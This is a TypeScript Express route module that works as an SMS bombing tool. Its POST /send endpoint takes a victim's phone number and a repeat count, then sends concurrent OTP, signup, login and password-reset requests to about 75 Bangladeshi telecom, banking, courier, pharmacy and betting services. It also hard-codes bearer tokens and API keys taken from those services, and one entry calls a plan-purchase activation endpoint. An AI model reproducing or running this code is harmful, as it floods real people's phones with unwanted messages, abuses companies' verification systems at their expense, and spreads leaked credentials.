import { Router } from "express";
import type { Request, Response } from "express";

const router = Router();

interface ApiDef {
  name: string;
  fn: (phone: string) => Promise<void>;
}

async function callApi(url: string, options: RequestInit = {}): Promise<void> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 8000);
  try {
    await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

function buildApis(phone: string): ApiDef[] {
  const cleaned = phone.replace(/^0/, "");
  const p0 = "0" + cleaned;
  const p88 = "88" + cleaned;
  const pp88 = "+88" + cleaned;
  const pp880 = "+880" + cleaned;
  const intl = "+88-" + cleaned;

  return [
    // ── OLD APIS (49) ──────────────────────────────────────────────
    {
      name: "PaperFly",
      fn: async () => {
        await callApi("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ full_name: "Test User", company_name: "Test Co", email_address: "test@email.com", phone_number: p0 }),
        });
      },
    },
    {
      name: "Ghoori",
      fn: async () => {
        await callApi("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobile_no: p0 }),
        });
      },
    },
    {
      name: "Doctime",
      fn: async () => {
        await callApi("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ data: { country_calling_code: "88", contact_no: p0 } }),
        });
      },
    },
    {
      name: "Sundarban",
      fn: async () => {
        await callApi("https://api-gateway.sundarbancourierltd.com/graphql", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p0 } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter } } }" }),
        });
      },
    },
    {
      name: "Apex4U",
      fn: async () => {
        await callApi("https://api.apex4u.com/api/auth/login", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phoneNumber: p0 }),
        });
      },
    },
    {
      name: "Robi",
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/send-otp", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" },
          body: JSON.stringify({ phone_number: p0, type: "doorstep" }),
        });
      },
    },
    {
      name: "Banglalink",
      fn: async () => {
        await callApi("https://web-api.banglalink.net/api/v1/user/number/validation/" + p0);
      },
    },
    {
      name: "Banglalink OTP",
      fn: async () => {
        await callApi("https://web-api.banglalink.net/api/v1/user/otp-login/request", {
          method: "POST", headers: { "content-type": "application/json", "client-security-token": "1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ" },
          body: JSON.stringify({ mobile: p0 }),
        });
      },
    },
    {
      name: "Grameenphone",
      fn: async () => {
        await callApi("https://webloginda.grameenphone.com/backend/api/v1/otp", {
          method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
          body: "msisdn=" + p0,
        });
      },
    },
    {
      name: "Robi Offer",
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/send-otp", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" },
          body: JSON.stringify({ phone_number: p0, type: "my_offer" }),
        });
      },
    },
    {
      name: "Robi DA",
      fn: async () => {
        await callApi("https://da-api.robi.com.bd/da-nll/otp/send", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ msisdn: p0 }),
        });
      },
    },
    {
      name: "Robi Chat",
      fn: async () => {
        await callApi("https://webapi.robi.com.bd/v1/chat/send-otp", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" },
          body: JSON.stringify({ phone_number: p0, name: "Test User", type: "video-chat" }),
        });
      },
    },
    {
      name: "Redx",
      fn: async () => {
        await callApi("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phoneNumber: p0 }),
        });
      },
    },
    {
      name: "Fundesh",
      fn: async () => {
        await callApi("https://fundesh.com.bd/api/auth/generateOTP?service_key=", {
          method: "POST", headers: { "content-type": "application/json; charset=UTF-8" },
          body: JSON.stringify({ msisdn: p0 }),
        });
      },
    },
    {
      name: "Bikroy",
      fn: async () => {
        await callApi("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + p0);
      },
    },
    {
      name: "MotionView",
      fn: async () => {
        await callApi("https://api.motionview.com.bd/api/send-otp-phone-signup", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Chorki",
      fn: async () => {
        await callApi("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ number: pp88 }),
        });
      },
    },
    {
      name: "Jatri",
      fn: async () => {
        await callApi("https://user-api.jslglobal.co:444/v2/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: pp88, jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" }),
        });
      },
    },
    {
      name: "ChinaOnline",
      fn: async () => {
        await callApi("https://chinaonlinebd.com/api/login/getOtp?phone=" + p0);
      },
    },
    {
      name: "Deepto",
      fn: async () => {
        await callApi("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ number: pp880 }),
        });
      },
    },
    {
      name: "Shikho",
      fn: async () => {
        await callApi("https://api.shikho.com/auth/v2/send/sms", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0, type: "student", auth_type: "signup", vendor: "shikho" }),
        });
      },
    },
    {
      name: "Redx Signup",
      fn: async () => {
        await callApi("https://api.redx.com.bd/v1/user/signup", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ name: "Test User", phoneNumber: p0, service: "redx" }),
        });
      },
    },
    {
      name: "Bioscope",
      fn: async () => {
        await callApi("https://www.bioscopelive.com/en/login/send-otp?phone=88" + p0 + "&operator=bd-otp", { method: "POST" });
      },
    },
    {
      name: "Binge",
      fn: async () => {
        await callApi("https://ss.binge.buzz/otp/send/login" + p0, { method: "POST" });
      },
    },
    {
      name: "AppLink",
      fn: async () => {
        await callApi("https://applink.com.bd/appstore-v4-server/login/otp/request", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ msisdn: p88 }),
        });
      },
    },
    {
      name: "Chokrojan",
      fn: async () => {
        await callApi("https://chokrojan.com/api/v1/passenger/login/mobile", {
          method: "POST", headers: { "content-type": "application/json", "domain-name": "chokrojan.com", "user-platform": "3" },
          body: JSON.stringify({ mobile_number: p0 }),
        });
      },
    },
    {
      name: "Dhaka Bank",
      fn: async () => {
        await callApi("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobileNo: p0, product_id: "250", requestChannel: "MOB", trackingStatus: 5 }),
        });
      },
    },
    {
      name: "Easy",
      fn: async () => {
        await callApi("https://core.easy.com.bd/api/v1/registration", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ name: "Test User", email: "test@email.com", mobile: p0, password: "pass123", password_confirmation: "pass123", device_key: "test123" }),
        });
      },
    },
    {
      name: "Eshop",
      fn: async () => {
        await callApi("https://eshop-api.banglalink.net/api/v1/customer/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ type: "phone", phone: p0 }),
        });
      },
    },
    {
      name: "FSIBL",
      fn: async () => {
        await callApi("https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobileNo: p0, product_id: "122", requestChannel: "MOB", trackingStatus: 5 }),
        });
      },
    },
    {
      name: "MyGP",
      fn: async () => {
        await callApi("https://api.mygp.cinematic.mobi/api/v1/otp/88" + p0 + "/SBENT_3GB7D", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ accessinfo: { access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", referenceCode: "20190827042622" } }),
        });
      },
    },
    {
      name: "GP Shop",
      fn: async () => {
        await callApi("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0, email: "", language: "en" }),
        });
      },
    },
    {
      name: "Hishabee",
      fn: async () => {
        await callApi("https://app.hishabee.business/api/V2/otp/send?mobile_number=" + p0, { method: "POST" });
      },
    },
    {
      name: "Iqra",
      fn: async () => {
        await callApi("http://apibeta.iqra-live.com/api/v1/sent-otp/" + p0);
      },
    },
    {
      name: "Robi Smart",
      fn: async () => {
        await callApi("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ cli: cleaned }),
        });
      },
    },
    {
      name: "MCB",
      fn: async () => {
        await callApi("https://www.mcbaffiliate.com/Affiliate/RequestOTP", {
          method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
          body: "PhoneNumber=" + p0,
        });
      },
    },
    {
      name: "Mithai",
      fn: async () => {
        await callApi("https://mithaibd.com/api/login/", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==" },
          body: JSON.stringify({ phone: p0, email: `test${p0}@gmail.com`, password1: "Pass123@", password2: "Pass123@", company_id: "2", storefront_id: "5" }),
        });
      },
    },
    {
      name: "EnglishMoja",
      fn: async () => {
        await callApi("https://api.englishmojabd.com/api/v1/auth/login", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: pp88 }),
        });
      },
    },
    {
      name: "MoveOn",
      fn: async () => {
        await callApi("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "OshudPotro",
      fn: async () => {
        await callApi("https://api.osudpotro.com/api/v1/users/send_otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobile: intl, deviceToken: "app", language: "bn", os: "android" }),
        });
      },
    },
    {
      name: "MyGP Login",
      fn: async () => {
        await callApi("https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" + p0 + "&lang=en");
      },
    },
    {
      name: "Qcoom",
      fn: async () => {
        await callApi("https://auth.qcoom.com/api/v1/otp/send", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobileNumber: pp88 }),
        });
      },
    },
    {
      name: "Circle",
      fn: async () => {
        await callApi("https://reseller.circle.com.bd/api/v2/auth/signup", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ name: pp88, email_or_phone: pp88, password: "pass123", password_confirmation: "pass123", register_by: "phone" }),
        });
      },
    },
    {
      name: "Shomvob",
      fn: async () => {
        await callApi("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "ToyBox",
      fn: async () => {
        await callApi("https://toybox.com.bd/api/v1/otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Win2Gain",
      fn: async () => {
        await callApi("https://win2gain.com.bd/api/v1/auth/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Kepler",
      fn: async () => {
        await callApi("https://kepler.com.bd/api/auth/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Roots Edu",
      fn: async () => {
        await callApi("https://rootsedulive.com/api/v1/auth/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Roots Forget",
      fn: async () => {
        await callApi("https://rootsedulive.com/api/v1/auth/forget-password", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },

    // ── NEW APIS (from s_bomb file) ────────────────────────────────
    {
      name: "BTCL MyBTCL",
      fn: async () => {
        await callApi("https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", {
          method: "POST", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
          body: JSON.stringify({ phoneNbr: p0, email: "", OTPType: 1, userName: "" }),
        });
      },
    },
    {
      name: "BTCL PhoneBill",
      fn: async () => {
        await callApi("https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", {
          method: "POST", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
          body: JSON.stringify({ phoneNbr: p0, email: "", OTPType: 1, userName: "" }),
        });
      },
    },
    {
      name: "Bioscope Plus",
      fn: async () => {
        await callApi("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ number: pp88 }),
        });
      },
    },
    {
      name: "BD Tickets",
      fn: async () => {
        await callApi("https://api.bdtickets.com:20100/v1/auth", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ createUserCheck: true, phoneNumber: pp88, applicationChannel: "WEB_APP" }),
        });
      },
    },
    {
      name: "Swap",
      fn: async () => {
        await callApi("https://api.swap.com.bd/api/v1/send-otp/v2", {
          method: "POST", headers: { "content-type": "application/json", signature: "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Arogga",
      fn: async () => {
        await callApi("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10", {
          method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
          body: "mobile=" + p0 + "&fcmToken=&referral=",
        });
      },
    },
    {
      name: "Garibook",
      fn: async () => {
        await callApi("https://api.garibookadmin.com/api/v3/user/login", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ mobile: p0, recaptcha_token: "garibookcaptcha", channel: "web" }),
        });
      },
    },
    {
      name: "Sheba",
      fn: async () => {
        await callApi("https://accountkit.sheba.xyz/api/shoot-otp", {
          method: "POST", headers: { "content-type": "application/json", "custom-headers": '{"portal-name": "Customer Web"}' },
          body: JSON.stringify({ mobile: pp88, app_id: "8329815A6D1AE6DD", api_token: "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH" }),
        });
      },
    },
    {
      name: "AppLink2",
      fn: async () => {
        await callApi("https://apps.applink.com.bd/appstore-v4-server/login/otp/request", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ msisdn: p88 }),
        });
      },
    },
    {
      name: "MyGP Cinematic",
      fn: async () => {
        await callApi(`https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/${pp88}`, {
          method: "POST", headers: { "content-type": "application/json;charset=UTF-8", Authorization: "Bearer 1pake4mh5ln64h5t26kpvm3iri" },
          body: JSON.stringify({}),
        });
      },
    },
    {
      name: "MedEasy",
      fn: async () => {
        await callApi(`https://api.medeasy.health/api/send-otp/${pp88}/`, {
          method: "POST", headers: { accept: "application/json" },
          body: JSON.stringify({}),
        });
      },
    },
    {
      name: "TheClinicall",
      fn: async () => {
        await callApi("https://theclinicall.com/bkapi/auth/user/otp/signin", {
          method: "POST", headers: { "content-type": "application/json", authorization: "Bearer Hello" },
          body: JSON.stringify({ countryCode: "BD", dialCode: "880", phone: cleaned }),
        });
      },
    },
    {
      name: "Care Box",
      fn: async () => {
        await callApi("https://www.api-care-box.click/api/user/register/?version=otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ Name: "Rakib Khan", Phone: pp880 }),
        });
      },
    },
    {
      name: "Renix Care",
      fn: async () => {
        await callApi("https://renixapi.renixcare.com/sms-api/send-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "Jayabaji",
      fn: async () => {
        await callApi("https://www.jayabaji3.com/api/register/check-username", {
          method: "POST", headers: { "content-type": "application/json", device: "desktop", domain: "www.jayabaji3.com", lang: "bn-bd" },
          body: JSON.stringify({ username: "sojib12345", email: "", mobileno: cleaned, language: "bn", langCountry: "bn-bd" }),
        });
      },
    },
    {
      name: "PKLuck2 Reg",
      fn: async () => {
        await callApi("https://www.pkluck2.com/wps/verification/sms/register", {
          method: "POST", headers: { "content-type": "application/json", Device: "web", Language: "BN", Merchant: "pklubdtf4" },
          body: JSON.stringify({ countryDialingCode: "880", mobileNo: p0 }),
        });
      },
    },
    {
      name: "PKLuck2 Login",
      fn: async () => {
        await callApi("https://www.pkluck2.com/wps/verification/sms/noLogin", {
          method: "POST", headers: { "content-type": "application/json", Device: "web", Language: "BN", Merchant: "pklubdtf4" },
          body: JSON.stringify({ mobileNum: p0, countryDialingCode: "880" }),
        });
      },
    },
    {
      name: "GP Flexiplan",
      fn: async () => {
        await callApi("https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", {
          method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer null" },
          body: JSON.stringify({ payment_mode: "mobile_balance", longevity: 1, voice: 100, data: 0, fourg: 0, bioscope: 0, sms: 0, mca: 0, price: 69, msisdn: p0, bundle_id: 60817, is_login: false }),
        });
      },
    },
    {
      name: "GP FWA",
      fn: async () => {
        await callApi("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ phone: p0, email: "", language: "en" }),
        });
      },
    },
    {
      name: "Mevrik",
      fn: async () => {
        await callApi("https://channels.mevrik.com:4202/api/v1/claim-session", {
          method: "POST", headers: { "content-type": "text/plain", "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE" },
          body: JSON.stringify({ data: { user_ref: p0, name: "MD Hossain" } }),
        });
      },
    },
    {
      name: "Priyoshikkhaloy",
      fn: async () => {
        await callApi("https://app.priyoshikkhaloy.com/api/user/register-login.php", {
          method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
          body: "mobile=" + p0,
        });
      },
    },
    {
      name: "Sailor Clothing",
      fn: async () => {
        await callApi("https://backend.sailor.clothing/api/v2/auth/password/forget_request", {
          method: "POST", headers: { "content-type": "application/json", authorization: "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr" },
          body: JSON.stringify({ email_or_phone: p0, send_code_by: "phone" }),
        });
      },
    },
    {
      name: "Shombhob",
      fn: async () => {
        await callApi("https://shombhob.com/api/otp-login", {
          method: "POST", headers: { "content-type": "application/json", "x-requested-with": "XMLHttpRequest" },
          body: JSON.stringify({ phone: p0 }),
        });
      },
    },
    {
      name: "ePharma",
      fn: async () => {
        await callApi("https://epharma.com.bd/authentication/send-otp", {
          method: "POST", headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest" },
          body: "number=" + pp88,
        });
      },
    },
  ];
}

router.post("/send", async (req: Request, res: Response) => {
  const { phone, amount } = req.body as { phone: string; amount: number };

  if (!phone || !amount) {
    res.status(400).json({ error: "phone and amount required" });
    return;
  }

  const apis = buildApis(phone);
  const allResults: { name: string; success: boolean }[] = [];
  let successCount = 0;
  let failCount = 0;

  const cycles = Math.max(1, Math.min(Number(amount), 10));

  for (let cycle = 0; cycle < cycles; cycle++) {
    const cycleResults = await Promise.allSettled(
      apis.map((api) =>
        api.fn()
          .then(() => ({ name: api.name, success: true }))
          .catch(() => ({ name: api.name, success: false }))
      )
    );

    for (const r of cycleResults) {
      const result = r.status === "fulfilled" ? r.value : { name: "unknown", success: false };
      allResults.push(result);
      if (result.success) successCount++;
      else failCount++;
    }
  }

  res.json({
    results: allResults,
    successCount,
    failCount,
    totalApis: apis.length * cycles,
  });
});

export default router;
